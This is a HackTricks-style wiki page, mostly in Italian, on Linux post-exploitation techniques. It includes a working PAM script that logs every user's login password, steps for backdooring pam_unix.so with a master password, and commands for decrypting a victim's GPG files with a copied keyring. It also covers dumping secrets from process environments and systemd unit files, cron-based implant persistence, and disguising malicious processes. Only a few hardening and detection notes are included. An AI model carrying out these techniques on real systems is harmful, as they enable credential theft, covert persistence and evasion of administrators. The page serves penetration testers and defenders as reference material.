# Linux Post-Exploitation

{{#include ../../banners/hacktricks-training.md}}

## Sniffing Logon Passwords with PAM

Configuriamo un modulo PAM per registrare ogni password che ogni utente usa per il login. Se non sai cos'è PAM consulta:

{{#ref}}
pam-pluggable-authentication-modules.md
{{#endref}}

**For further details check the [original post](https://embracethered.com/blog/posts/2022/post-exploit-pam-ssh-password-grabbing/)**. Questo è solo un riepilogo:

**Panoramica della tecnica:**
Pluggable Authentication Modules (PAM) offrono flessibilità nella gestione dell'autenticazione sui sistemi basati su Unix. Possono migliorare la sicurezza personalizzando i processi di login ma rappresentano anche un rischio se usati in modo improprio. Questo riepilogo descrive una tecnica per catturare le credenziali di accesso usando PAM, insieme a strategie di mitigazione.

**Cattura delle credenziali:**

- Uno script bash chiamato `toomanysecrets.sh` viene creato per registrare i tentativi di login, salvando la data, lo username (`$PAM_USER`), la password (da stdin) e l'IP dell'host remoto (`$PAM_RHOST`) in `/var/log/toomanysecrets.log`.
- Lo script viene reso eseguibile e integrato nella configurazione PAM (`common-auth`) usando il modulo `pam_exec.so` con opzioni per eseguirlo silenziosamente e passare il token di autenticazione allo script.
- L'approccio dimostra come un host Linux compromesso possa essere sfruttato per registrare le credenziali in modo discreto.
```bash
#!/bin/sh
echo " $(date) $PAM_USER, $(cat -), From: $PAM_RHOST" >> /var/log/toomanysecrets.log
sudo touch /var/log/toomanysecrets.sh
sudo chmod 770 /var/log/toomanysecrets.sh
sudo nano /etc/pam.d/common-auth
# Add: auth optional pam_exec.so quiet expose_authtok /usr/local/bin/toomanysecrets.sh
sudo chmod 700 /usr/local/bin/toomanysecrets.sh
```
### Backdooring PAM

**Per ulteriori dettagli consulta il [original post](https://infosecwriteups.com/creating-a-backdoor-in-pam-in-5-line-of-code-e23e99579cd9)**. Questa è solo una sintesi:

Il Pluggable Authentication Module (PAM) è un sistema usato su Linux per l'autenticazione degli utenti. Opera su tre concetti principali: **nome utente**, **password**, e **servizio**. I file di configurazione per ogni servizio si trovano nella directory `/etc/pam.d/`, dove le librerie condivise gestiscono l'autenticazione.

**Obiettivo**: Modificare PAM per permettere l'autenticazione con una password specifica, bypassando la password effettiva dell'utente. Questo riguarda in particolare la libreria condivisa `pam_unix.so` usata dal file `common-auth`, che viene inclusa da quasi tutti i servizi per la verifica della password.

### Steps for Modifying `pam_unix.so`:

1. **Locate the Authentication Directive** in the `common-auth` file:
- The line responsible for checking a user's password calls `pam_unix.so`.
2. **Modify Source Code**:
- Add a conditional statement in the `pam_unix_auth.c` source file that grants access if a predefined password is used, otherwise, it proceeds with the usual authentication process.
3. **Recompile and Replace** the modified `pam_unix.so` library in the appropriate directory.
4. **Testing**:
- Access is granted across various services (login, ssh, sudo, su, screensaver) with the predefined password, while normal authentication processes remain unaffected.

> [!TIP]
> Puoi automatizzare questo processo con [https://github.com/zephrax/linux-pam-backdoor](https://github.com/zephrax/linux-pam-backdoor)

## Decrypting GPG loot via homedir relocation

Se trovi un file `.gpg` cifrato e la cartella `~/.gnupg` di un utente (pubring, private-keys, trustdb) ma non riesci a decifrarlo a causa di permessi/lock dell'homedir di GnuPG, copia il keyring in una posizione scrivibile e usalo come tuo GPG home.

Errori tipici che vedrai senza questo: "unsafe ownership on homedir", "failed to create temporary file", oppure "decryption failed: No secret key" (perché GPG non può leggere/scrivere l'homedir originale).

Flusso di lavoro:
```bash
# 1) Stage a writable homedir and copy the victim's keyring
mkdir -p /dev/shm/fakehome/.gnupg
cp -r /home/victim/.gnupg/* /dev/shm/fakehome/.gnupg/
# 2) Ensure ownership & perms are sane for gnupg
chown -R $(id -u):$(id -g) /dev/shm/fakehome/.gnupg
chmod 700 /dev/shm/fakehome/.gnupg
# 3) Decrypt using the relocated homedir (either flag works)
GNUPGHOME=/dev/shm/fakehome/.gnupg gpg -d /home/victim/backup/secrets.gpg
# or
gpg --homedir /dev/shm/fakehome/.gnupg -d /home/victim/backup/secrets.gpg
```
Se il materiale della chiave segreta è presente in `private-keys-v1.d`, GPG sbloccherà e decifrerà senza richiedere una passphrase (o la richiederà se la chiave è protetta).


## Raccolta di credenziali dall'ambiente dei processi (containers inclusi)

Quando ottieni code execution all'interno di un servizio, il processo spesso eredita variabili di ambiente sensibili. Queste sono una miniera d'oro per lateral movement.

Quick wins
- Esegui il dump delle variabili d'ambiente del processo corrente: `env` o `printenv`
- Esegui il dump delle variabili d'ambiente di un altro processo: `tr '\0' '\n' </proc/<PID>/environ | sed -n '1,200p'`
- Aggiungi `strings -z /proc/<PID>/environ` se `tr`/`sed` non sono disponibili
- Nei containers, controlla anche PID 1: `tr '\0' '\n' </proc/1/environ`

What to look for
- Segreti dell'app e credenziali admin (per esempio, Grafana imposta `GF_SECURITY_ADMIN_USER`, `GF_SECURITY_ADMIN_PASSWORD`)
- API keys, DB URIs, credenziali SMTP, OAuth secrets
- Override di proxy e TLS: `http_proxy`, `https_proxy`, `SSL_CERT_FILE`, `SSL_CERT_DIR`

Notes
- Molte orchestrazioni passano impostazioni sensibili tramite variabili d'ambiente; queste vengono ereditate dai processi figli ed esposte a qualsiasi shell arbitraria che avvii nel contesto del processo.
- In alcuni casi, quelle credenziali vengono riutilizzate a livello di sistema (es., stessa username/password valida per SSH sull'host), permettendo un pivot facile.

## Systemd-stored credentials in unit files (Environment=)

I servizi avviati da systemd possono includere credenziali nei file unit come voci `Environment=`. Enumerale ed estraili:
```bash
# Unit files and drop-ins
ls -la /etc/systemd/system /lib/systemd/system
# Grep common patterns
sudo grep -R "^Environment=.*" /etc/systemd/system /lib/systemd/system 2>/dev/null | sed 's/\x00/\n/g'
# Example of a root-run web panel
# [Service]
# Environment="BASIC_AUTH_USER=root"
# Environment="BASIC_AUTH_PWD=<password>"
# ExecStart=/usr/bin/crontab-ui
# User=root
```
Operational artifacts often leak passwords (e.g., backup scripts that call `zip -P <pwd>`). Those values are frequently reused in internal web UIs (Basic-Auth) or other services.

- Hardening
  - Spostare i segreti in secret store dedicati (`systemd-ask-password`, `EnvironmentFile` con permessi bloccati, o external secret managers)
  - Evitare di incorporare creds in unit files; preferire drop-in file leggibili solo da root e rimuoverli dal version control
  - Ruotare leaked passwords scoperte durante i test

## Cron-based persistence with loopback mutex

- Copiare gli implant in più percorsi scrivibili (`/tmp`, `/var/tmp`, `/dev/shm`, `/run/lock`) e installare voci cron come `*/5 * * * * /tmp/<bin>` in modo che si riavviino anche se rimossi altrove.
- Forzare l'esecuzione a **istanza singola** legando una porta loopback fissa (per esempio, `127.0.0.1:51125` o `127.0.0.1:52225`) ed uscire se `bind()` fallisce; `ss -lntp | grep -E '51125|52225'` rivelerà il listener del mutex.
- Gli operator possono periodicamente killare in massa qualsiasi processo il cui `cmdline` contiene il nome del dropper (es., `init_stop`), quindi riutilizzare quei nomi durante l'analisi può causare collisioni; scegliere nomi di file unici.

## Process masquerading via prctl + argv overwrite

- Impostare il nome breve del processo con `prctl(PR_SET_NAME, "<label>")` (limite `comm` di 15 byte), comunemente `init`, così `/proc/<pid>/status` e le GUI mostrano un'etichetta innocua.
- Sovrascrivere il buffer in-memory `argv[0]` dopo aver letto la lunghezza di `/proc/self/cmdline` e il puntatore `argv[0]`, riempiendo con NUL in modo che `/proc/<pid>/cmdline` e `ps` mostrino anch'essi l'etichetta finta.
- Individuare confrontando `Name:` in `/proc/<pid>/status` con il percorso reale dell'eseguibile e cercando listener di loopback mutex appartenenti a processi con cmdline molto corto/vuoto.

## References

- [0xdf – HTB Planning (Grafana env creds reuse, systemd BASIC_AUTH)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [0xdf – HTB Environment (GPG homedir relocation to decrypt loot)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [GnuPG Manual – Home directory and GNUPGHOME](https://www.gnupg.org/documentation/manuals/gnupg/GPG-Configuration-Options.html#index-homedir)
- [Inside GoBruteforcer: AI-generated server defaults, weak passwords, and crypto-focused campaigns](https://research.checkpoint.com/2026/inside-gobruteforcer-ai-generated-server-defaults-weak-passwords-and-crypto-focused-campaigns/)

{{#include ../../banners/hacktricks-training.md}}
